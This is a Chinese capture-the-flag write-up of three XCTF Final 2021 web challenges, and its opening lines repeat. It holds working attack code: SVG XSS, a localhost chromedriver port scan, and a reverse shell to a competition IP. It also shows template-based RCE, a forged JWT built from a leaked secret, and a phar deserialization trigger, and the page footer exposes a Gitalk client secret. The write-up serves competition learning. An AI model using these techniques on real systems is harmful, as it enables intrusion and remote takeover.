<h2 id="Prologue">Prologue</h2>
<p>这应该是我个人最近最后一场比赛了，整体而言挺开心的，还和诸葛老师合了影（</p>
<h2 id="dngs2010">dngs2010</h2>
<p>由于源码里摆明了让我们去选svg，那我们就去选svg。<b<hr /><h2 id="Prologue">Prologue</h2><p>这应该是我个人最近最后一场比赛了，整体而言挺开心的，还和诸葛老师合了影（</p><h2 id="dngs2010">dngs2010</h2><p>由于源码里摆明了让我们去选svg，那我们就去选svg。<br>在返回的页面中，我们能看到我们输入的内容被这样拼接进了html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;10&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">&quot;http://q1.qlogo.cn/g?b=qq&amp;nk=&#123;input&#125;&amp;s=640&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p>继续浏览题目，发现选择二进制格式进行生成时除了像素低一点别的都一样，联想到题目中的selenium，不难猜到后段是用chrome渲染svg然后截图。多试几次就能发现，我们的输入位于 <code>/img/</code> 后的url中，程序取最后一个 <code>.</code> 前的内容作为输入，之后的内容作为生成方式。<br>自然而言，我们就是要打这个selenium了，不管怎么样先得xss，自然而言就得闭合标签。然而这里基本什么过滤都没有，非常舒适。</p><p>proof of concept:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(ses.get(<span class="string">&#x27;http://172.35.6.36:3000/img/745679136&quot; style=&quot;height:0&quot;&gt;&#x27;</span>+quote(<span class="string">f&#x27;&#x27;&#x27;&lt;/image&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;console.log(1)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;image&gt;&#x27;&#x27;&#x27;</span>, safe=<span class="string">&#x27; &lt;&gt;&#x27;</span>)+<span class="string">&#x27;.svg&#x27;</span>).text)</span><br></pre></td></tr></table></figure><p>result:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;480px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;120px&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#71e8f6&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">略</span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;10&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://q1.qlogo.cn/g?b=qq&amp;nk=745679136&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height:0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span><span class="symbol">&amp;amp;</span>s=640&quot;&gt;<span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;120&quot;</span> <span class="attr">y</span>=<span class="string">&quot;25&quot;</span>&gt;</span>晚上好,来自美国(T-Mobile)的朋友<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">略</span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里有两个小细节：</p><ul><li>xml规定一份文档只能有一个根结点，也就是说我们<strong>不能</strong>闭合svg标签。如果闭合了svg标签，html会报错导致截图不全，且svg闭合后的内容不会被渲染。</li><li>由于页面没有指定 <code>DOCTYPE HTML</code> ，我们的script标签中不能出现小于号大于号，不然会被识别成xml标签。</li></ul><p>第一个问题注意即可，第二个问题我们可以通过 <code>eval(btoa(代码))</code> 的方式进行规避。<br>之后的流程参考https://paper.seebug.org/1559/，扫描端口，并向webdriver发起请求，创建新的进程，反弹shell即可。文中涉及到跨域访问仅允许localhost客户端访问webdriver的问题在本题中也不存在，因为发起请求的正是localhost。<br>这道题整体而言对于这样的比赛来说没有难度，但是坑比较多，比如端口量较大，往往扫不到webdriver控制端口，再比如每次请求都启动了新的chromedriver进程，导致端口不一样，所以扫描把人扫得非常沮丧。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        我所使用的js部分exploit    </div>    <div class='spoiler-content'>        <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.state = <span class="string">&quot;&quot;</span>;</span><br><span class="line">(<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>).innerHTML = <span class="string">&quot;start&quot;</span>;</span><br><span class="line">    <span class="built_in">window</span>.state = <span class="string">&quot;start&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="number">42</span>;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">45000</span>; i &lt; <span class="number">65535</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i===<span class="number">3000</span>)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> x = <span class="keyword">await</span> fetch(<span class="string">`http://localhost:<span class="subst">$&#123;i&#125;</span>/sessions`</span>, &#123; <span class="attr">mode</span>: <span class="string">&quot;no-cors&quot;</span> &#125;);</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>).innerHTML = <span class="string">&quot;middle&quot;</span>;</span><br><span class="line">            <span class="built_in">window</span>.state = <span class="string">&quot;middle&quot;</span>;</span><br><span class="line">            <span class="built_in">window</span>.state = <span class="string">&quot;end&quot;</span>;</span><br><span class="line">            n = i;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>).innerHTML = n;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">window</span>.state == <span class="string">&quot;end&quot;</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>).innerHTML = err;</span><br><span class="line">            <span class="built_in">window</span>.state = <span class="string">&quot;err&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>).innerHTML += <span class="string">&quot;...&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> x = <span class="keyword">await</span> fetch(<span class="string">`http://localhost:<span class="subst">$&#123;n&#125;</span>/session`</span>, &#123;</span><br><span class="line">            method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            mode: <span class="string">&quot;no-cors&quot;</span>,</span><br><span class="line">            body: <span class="built_in">JSON</span>.stringify(&#123;<span class="string">&quot;capabilities&quot;</span>:&#123;<span class="string">&quot;alwaysMatch&quot;</span>:&#123;<span class="string">&quot;goog:chromeOptions&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;binary&quot;</span>:<span class="string">&quot;/usr/bin/python3&quot;</span>, <span class="string">&quot;args&quot;</span>: [<span class="string">&quot;-c__import__(\&quot;os\&quot;).system(\&quot;exec bash -i &amp;&gt;/dev/tcp/172.35.6.165/1234 &lt;&amp;1\&quot;)&quot;</span>]</span><br><span class="line">            &#125;&#125;&#125;&#125;),</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>).innerHTML += <span class="keyword">await</span> x.text();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>).innerHTML += <span class="string">&quot;error: &quot;</span> + err;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><svg width="480px" height="120px" fill="#a3185b" xmlns="http://www.w3.org/2000/svg"><rect fill="#5ce7a4" width="100%" height="100%"></rect><image x="10" y="10" width="100" height="100" href="http://q1.qlogo.cn/g?b=qq&amp;nk=745679136" style="height:0"></image><text x="10" y="20" id="result">46233...</text><image>&amp;s=640"&gt;</image><text x="120" y="25">晚上好,来自美国(T-Mobile)的朋友</text><text x="120" y="45">今天是 2021年5月29日 星期六</text><text x="120" y="65">您的IP是 172.35.6.165</text><text x="120" y="85">您使用的是 Mac OS 10.15.7 操作系统</text><text x="120" y="105">您使用的是 Chrome(91.0.4472.77) 浏览器</text><text x="10" y="85">仅供展示效果用</text></svg>    </div></div><h2 id="WarmupCMS">WarmupCMS</h2><p>审计代码，上手搜eval的时候发现有一个很可疑的 <code>function.math.php</code>，经查阅文档，发现cms并没有自带这个函数，故猜测这个模版函数是出题人自行实现，暂定为sink点。经过刚才的一番查文档，我们也了解到这个cms有模版功能。</p><p>我们可以通过数据库文件中的用户md5值在线反查出密码，进入后台 <code>/admincp.php</code>。</p><blockquote><p>题目中的文章需要进入后台刷新缓存后才能显示</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `icms_user` (`uid`, `gid`, `pid`, `username`, `nickname`, `password`, `gender`, `fans`, `follow`, `comments`, `article`, `favorite`, `credit`, `regip`, `regdate`, `lastloginip`, `lastlogintime`, `hits`, `hits_today`, `hits_yday`, `hits_week`, `hits_month`, `setting`, `type`, `status`) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>, <span class="number">65535</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;iCMS&#x27;</span>, <span class="string">&#x27;798709465daad71e1665888975791d7b&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1488883427</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1523165779</span>, <span class="number">303</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="string">&#x27;&#123;\&quot;inbox\&quot;:&#123;\&quot;receive\&quot;:\&quot;all\&quot;&#125;&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/backend.png" class=""><p>进入后台后不难发现cms作者的本意是不想让我们在网页上直接修改模版，对可以上传的文件后缀的设置也做了限制，作者还是进行了一些河里的思考的。</p><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/deny.png" class=""><p>可惜cms的上传目录可以相对于 <code>$webroot</code> 任意指定，而cms放置模版的目录正位于 <code>$webroot/template</code> 下。我们可以指定任意文件作为主页、文章等页面的模版（如 <code>htm</code> 文件），而 <code>htm</code> 处于上传后缀白名单中。也就是说我们可以将 <code>上传目录</code> 设置为 <code>template</code>，然后上传一份htm文件，在文件管理中获取到上传的文件名，并将其设置为主页模版，即可利用模版进行RCE。</p><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/specify_template.png" class=""><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/modify_settings.png" class=""><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/filename.png" class=""><p>回到math。虽然函数实现中对危险函数进行了限制，但我随手构造的 <code>&lt;!--&#123;math equation=(system(&quot;/readflag&quot;))&#125;--&gt;</code> 恰巧突破了这一限制（带括号）（又貌似是缓存有助攻）。由于是比赛，时间紧迫，便没有深究。</p><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/warmup_flag.png" class=""><h2 id="easy-cms">easy_cms</h2><p>由于题目并没有正确配置php服务器，我们需要通过手动指定controller来访问所有页面。</p><p>thinkphp，那我们先来看看有什么controller呗。</p><p>admin下的controller由于需要登录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!captcha_check(<span class="variable">$data</span>[<span class="string">&#x27;verify&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ValidateException(<span class="string">&#x27;验证码错误&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checkLogin(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;success(<span class="string">&#x27;登录成功&#x27;</span>, url(<span class="string">&#x27;admin/Index/index&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而服务端并没有安装图片相关拓展：</p><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/not_installed.png" class=""><p>所以登陆admin这条路基本是堵死了，也没必要继续看admin controller（当然不排除有些未认证的controller，只是这题确实没有）</p><p>在api 的 <code>Base</code> controller中我们发现有很明显的上传文件的方法，也有读取文件的方法，非常显然是让我们用phar反序列化来加载tp6的链。所以问题就在于如何登陆。我们回头看一眼路由，发现 <code>Base</code> controller被套了一个 <code>JwtAuth</code> 中间件。这一中间件取 <code>Authorization</code> 请求头的值作为jwt进行验证，认证通过则取token中的uid写入当前session。<code>JwtAuth</code> 调用了 <code>Jwt</code> 类，而生成 <code>Jwt</code> 的 api controller <code>Common</code> 中配置了jwt的参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// route.php</span></span><br><span class="line"></span><br><span class="line">Route::rule(<span class="string">&#x27;Base/Upload&#x27;</span>, <span class="string">&#x27;Base/Upload&#x27;</span>)-&gt;middleware([<span class="string">&#x27;JwtAuth&#x27;</span>]); <span class="comment">//图片上传;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Common controller</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$jwt</span></span><br><span class="line">    -&gt;setIss(config(<span class="string">&#x27;my.jwt_iss&#x27;</span>))</span><br><span class="line">    -&gt;setAud(config(<span class="string">&#x27;my.jwt_aud&#x27;</span>))</span><br><span class="line">    -&gt;setSecrect(config(<span class="string">&#x27;my.jwt_secrect&#x27;</span>))</span><br><span class="line">    -&gt;setExpTime(config(<span class="string">&#x27;my.jwt_expire_time&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// config/my.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//jwt鉴权配置</span></span><br><span class="line"><span class="string">&#x27;jwt_expire_time&#x27;</span>    =&gt; <span class="number">7200</span>,               <span class="comment">//token过期时间 默认2小时</span></span><br><span class="line"><span class="string">&#x27;jwt_secrect&#x27;</span>        =&gt; <span class="string">&#x27;boTCfOGKwqTNKArT&#x27;</span>, <span class="comment">//签名秘钥</span></span><br><span class="line"><span class="string">&#x27;jwt_iss&#x27;</span>            =&gt; <span class="string">&#x27;client.xhadmin&#x27;</span>,   <span class="comment">//发送端</span></span><br><span class="line"><span class="string">&#x27;jwt_aud&#x27;</span>            =&gt; <span class="string">&#x27;server.xhadmin&#x27;</span>,   <span class="comment">//接收端</span></span><br></pre></td></tr></table></figure><p>从配置文件中拿到jwt secret，仔细过一遍认证函数，把必要的属性都给加上，再把过期时间 (<code>exp</code>) 调的久一些，一个jwt就伪造好了</p><img src="/2021/05/30/Security/Writeup/XCTF-Final-2021/fake_token.png" class="" title="四千年后过期的token"><p>带着这个token，我们就能上传文件了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">host = <span class="string">&#x27;http://172.35.6.101:31337&#x27;</span></span><br><span class="line">info = ses.post(host+<span class="string">&#x27;/?s=api/Base/upload&#x27;</span>, headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: </span><br><span class="line">        <span class="string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.&#x27;</span></span><br><span class="line">        <span class="string">&#x27;eyJzdWIiOiIxMjM0NTY3ODkwIiwidWlkIjoxL&#x27;</span></span><br><span class="line">        <span class="string">&#x27;CJpc3MiOiJjbGllbnQueGhhZG1pbiIsImF1ZC&#x27;</span></span><br><span class="line">        <span class="string">&#x27;I6InNlcnZlci54aGFkbWluIiwiZXhwIjoxNTE&#x27;</span></span><br><span class="line">        <span class="string">&#x27;2MjM5MDIyMDAsImlhdCI6MTUxNjIzOTAyMn0.&#x27;</span></span><br><span class="line">        <span class="string">&#x27;vbtgheHpxnrT9W4VX1ybguJ15cwYO2pbVNCvrE7FqfU&#x27;</span></span><br><span class="line">&#125;, files=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.gif&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;phar.gif&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">&#125;).json()</span><br><span class="line"><span class="built_in">print</span>(info)</span><br><span class="line"><span class="comment"># &#123;&#x27;status&#x27;: &#x27;200&#x27;, &#x27;data&#x27;: &#x27;/uploads/api/202105/60b3b5da99bed.gif&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>同时，上传文件的 <code>upload</code> 方法下面就有 <code>checkFileExists</code> 方法，可以用于触发 phar 反序列化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">req = ses.get(host, params=&#123;</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;api/Base/checkFileExists&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;filepath&#x27;</span>: <span class="string">&#x27;phar:///var/www/html/public&#x27;</span>+info[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    <span class="comment"># 经过和出题人沟通，在比赛题目环境中必须使用绝对路径</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(req.text[-<span class="number">200</span>:])</span><br></pre></td></tr></table></figure><p>tp6的链略，<a href="https://lmgtfy.app">https://lmgtfy.app</a></p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"5955d155fe2ea768241e","clientSecret":"f96bbda9ff434950217f24f7f9369f8b8de3b025","repo":"frankli0324.github.io","owner":"frankli0324","admin":["frankli0324"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>